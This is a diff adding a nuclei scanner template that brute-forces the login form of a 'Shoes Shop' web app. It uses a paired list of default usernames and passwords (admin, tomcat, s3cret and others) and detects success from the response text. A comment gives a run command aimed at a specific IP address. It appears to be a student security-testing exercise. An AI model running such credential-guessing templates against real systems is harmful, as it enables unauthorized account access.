@@ -1,0 +1,65 @@
+id: Bruteforce-Shoes-Shop
+# nuclei -u http://103.90.225.135:8001 -t Bruteforce-Shoes-Shop.yaml -p http://127.0.0.1:8080
+
+info:
+  name: Bruteforce Shoes Shop Login Page 
+  author: Hung, Dat, Hoa, Danh
+  severity: high
+  description: Shoes Shop check some login credentials
+  tags: tomcat,apache,default-login
+
+requests:
+  - raw:
+      - |
+        POST /login HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+        Origin: {{BaseURL}}
+        Connection: close
+        Referer: {{BaseURL}}/login
+        Upgrade-Insecure-Requests: 1
+
+        username={{username}}&password={{password}}&submit=Login
+    
+    payloads:
+      username:
+        - admin
+        - apache
+        - tomcat
+        - admin
+        - root
+        - tomcat
+        - demo
+        - role1
+        - both
+        - tony
+
+      password:
+        - admin
+        - apache
+        - tomcat
+        - password123
+        - 123456789
+        - ADMIN
+        - demo
+        - s3cret
+        - iloveyou
+        - 123456
+
+    attack: pitchfork  # Available options: sniper, pitchfork and clusterbomb
+    redirects: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Login Success"
+        condition: and
+
+      - type: status
+        status:
+          - 200
